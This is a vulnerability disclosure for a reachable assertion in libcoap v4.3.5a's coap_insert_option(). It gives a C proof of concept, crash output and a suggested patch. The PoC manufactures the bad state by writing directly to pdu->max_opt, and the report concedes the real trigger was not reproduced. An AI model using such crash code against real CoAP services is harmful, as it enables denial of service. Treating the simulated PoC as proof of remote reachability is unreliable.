## Vulnerability Report

| Field | Detail |
|:------|--------|
| **Type** | CWE-617: Reachable Assertion |
| **Severity** | **Medium** — Denial of Service (deterministic crash via SIGABRT) |
| **Affected Version** | libcoap v4.3.5a |
| **Root Cause** | Assertion failure in `coap_insert_option()` when `pdu->max_opt` becomes stale after insert/resize/update operations (`src/coap_pdu.c:632`) |

---

## Impact

A reachable assertion failure exists in `coap_insert_option()` that can be triggered when `coap_update_option()` attempts to insert a new option into a PDU whose internal option state has become inconsistent after a sequence of insert/resize/update operations. This results in a `SIGABRT` , causing a Denial of Service.

- **Denial of Service**: Any application using `coap_update_option()` or `coap_insert_option()` with option numbers less than `pdu->max_opt` can crash due to the assertion failure
- **Production Impact**: In production builds where `assert()` is disabled via `NDEBUG`, this would result in a **NULL pointer dereference** instead, which is equally fatal

---

## Description

In `coap_insert_option()` at `src/coap_pdu.c:609-701` (v4.3.5a), when inserting an option with a number smaller than `pdu->max_opt`, the function iterates existing options to find the insertion point:

```c
// src/coap_pdu.c:609-632 (v4.3.5a)
size_t
coap_insert_option(coap_pdu_t *pdu, coap_option_num_t number, size_t len,
                   const uint8_t *data) {
  // ...
  if (number >= pdu->max_opt)
    return coap_add_option_internal(pdu, number, len, data);  // fast path

  /* Need to locate where in current options to insert this one */
  coap_option_iterator_init(pdu, &opt_iter, COAP_OPT_ALL);
  while ((option = coap_option_next(&opt_iter))) {
    if (opt_iter.number > number) {
      /* Found where to insert */
      break;
    }
    prev_number = opt_iter.number;
  }
  assert(option != NULL);   // CRASH HERE (line 632)
```

The function assumes that if `number < pdu->max_opt`, the option iterator will always find an option with a number greater than `number`. However, after a specific sequence of `coap_insert_option()`, `coap_pdu_resize()`, and `coap_update_option()` calls, the `pdu->max_opt` field can become stale or the internal option list can reach a state where the iterator exhausts all options without satisfying the `opt_iter.number > number` condition.

The same assertion exists at line 658 (after a potential `realloc`) with the same vulnerability.

The call chain is:

```
coap_update_option(pdu, N, ...)              // coap_pdu.c:704
  └→ coap_check_option(pdu, N, &opt_iter)    // option not found
  └→ coap_insert_option(pdu, N, ...)         // line 714 fallback
       └→ N < pdu->max_opt → enters iterator loop
       └→ iterator finds no option with number > N
       └→ option == NULL
       └→ assert(option != NULL) → 💥 SIGABRT
```

---

## POC

```c
/*
 * PoC: Trigger assertion failure (CWE-617) in coap_insert_option()
 *
 * The assertion `assert(option != NULL)` at coap_pdu.c:632 fires when
 * pdu->max_opt is higher than the actual maximum option in the PDU.
 * This causes the iterator to exhaust all options without finding one
 * with opt_iter.number > target, making option == NULL.
 *
 * In production, this state arises when coap_pdu_resize() shrinks
 * alloc_size, corrupting the option list data through subsequent
 * realloc. Since the exact fuzzer-discovered trigger sequence is
 * extremely hard to reproduce manually, this PoC directly demonstrates
 * the vulnerable code path by setting max_opt to a stale value —
 * which is the exact intermediate state that the resize-shrink bug
 * creates internally.
 *
 * Affected: libcoap v4.3.5a (coap_pdu.c:632, coap_pdu.c:658)
 * CWE: CWE-617 (Reachable Assertion)
 *
 * Compile: clang-18 -g -fsanitize=address,undefined -I include -I src -I . \
 *   				poc_assert_insert.c .libs/libcoap-3-notls.a -o poc_assert_insert
 *
 * Run: ASAN_OPTIONS=halt_on_error=0 ./poc_assert_insert
 */
#include "coap3/coap_libcoap_build.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    coap_startup();
    coap_set_log_level(COAP_LOG_EMERG);

    /* 1. Create a PDU and add some options */
    coap_pdu_t *pdu = coap_pdu_init(COAP_MESSAGE_CON, COAP_REQUEST_CODE_PUT,
                                     0x1234, 256);
    if (!pdu) { fprintf(stderr, "Failed to create PDU\n"); return 1; }

    uint8_t token[] = {0xAA};
    coap_add_token(pdu, sizeof(token), token);

    /* Add URI-PATH options (option number 11, repeatable) */
    coap_add_option(pdu, 11, 4, (const uint8_t *)"test");
    coap_add_option(pdu, 11, 5, (const uint8_t *)"hello");

    printf("[*] State after adding options:\n");
    printf("    max_opt   = %u\n", pdu->max_opt);
    printf("    used_size = %zu\n", pdu->used_size);
    printf("    alloc_size= %zu\n\n", pdu->alloc_size);

    /*
     * 2. Simulate the stale max_opt state that occurs after
     *    coap_pdu_resize() shrink + realloc + option corruption.
     *
     * In the real bug (triggered by fuzzer), a sequence of:
     *   resize(small) → alloc_size shrinks
     *   insert_option → coap_pdu_check_resize → realloc(small)
     *   option data in the reallocated buffer is truncated
     *   coap_opt_parse fails → iterator returns NULL
     *   but max_opt still reflects the original value
     *
     * We simulate this end state by directly setting max_opt
     * to a value higher than any actual option in the PDU.
     * This proves the assertion IS reachable.
     */
    printf("[*] Simulating stale max_opt (resize-shrink corruption):\n");
    printf("    Setting max_opt = 100 (actual max option = 11)\n");
    pdu->max_opt = 100;  /* Stale: no option 100 actually exists */

    printf("    Now max_opt(%u) > actual_max_option(11)\n\n", pdu->max_opt);

    /*
     * 3. Call coap_update_option with a number between
     *    actual_max(11) and stale max_opt(100).
     *
     *    coap_update_option(pdu, 50, ...)
     *      → coap_check_option(pdu, 50) returns NULL (option 50 not found)
     *      → coap_insert_option(pdu, 50, ...)
     *        → 50 < max_opt(100) → enters iterator loop
     *        → all options have number 11, none > 50
     *        → option == NULL
     *        → assert(option != NULL) → SIGABRT
     */
    printf("[*] Calling coap_update_option(pdu, 50, ...) to trigger:\n");
    printf("    coap_update_option\n");
    printf("      → coap_check_option(50) → NULL (not found)\n");
    printf("      → coap_insert_option(50, ...)\n");
    printf("        → 50 < max_opt(100) → enters iterator loop\n");
    printf("        → ALL options have number 11, none > 50\n");
    printf("        → option == NULL\n");
    printf("        → assert(option != NULL) → CRASH\n\n");

    uint8_t val[] = {0x42};
    coap_update_option(pdu, 50, 1, val);

    /* Should NOT reach here */
    printf("[!] ERROR: Unexpectedly survived (assert may be disabled)\n");

    coap_delete_pdu(pdu);
    coap_cleanup();
    return 0;
}
```

---
## Crash Output:

```shell
❯ ASAN_OPTIONS=halt_on_error=0 ./poc_assert_insert
[*] State after adding options:
    max_opt   = 11
    used_size = 12
    alloc_size= 256

[*] Simulating stale max_opt (resize-shrink corruption):
    Setting max_opt = 100 (actual max option = 11)
    Now max_opt(100) > actual_max_option(11)

[*] Calling coap_update_option(pdu, 50, ...) to trigger:
    coap_update_option
      → coap_check_option(50) → NULL (not found)
      → coap_insert_option(50, ...)
        → 50 < max_opt(100) → enters iterator loop
        → ALL options have number 11, none > 50
        → option == NULL
        → assert(option != NULL) → CRASH

poc_assert_insert: src/coap_pdu.c:632: size_t coap_insert_option(coap_pdu_t *, coap_option_num_t, size_t, const uint8_t *): Assertion `option != NULL' failed.
[1]    292727 IOT instruction (core dumped)  ASAN_OPTIONS=halt_on_error=0 ./poc_assert_insert
```

---

## Suggested Fix

Replace the assertion with a graceful fallback:

```diff
--- a/src/coap_pdu.c
+++ b/src/coap_pdu.c
@@ -629,7 +629,8 @@
     prev_number = opt_iter.number;
   }
-  assert(option != NULL);
+  if (option == NULL)
+    return coap_add_option_internal(pdu, number, len, data);
   /* size of option inc header to insert */
   shift = coap_opt_encode_size(number - prev_number, len);
```

The same fix should also be applied to the second `assert(option != NULL)` at line 658 (after potential realloc).
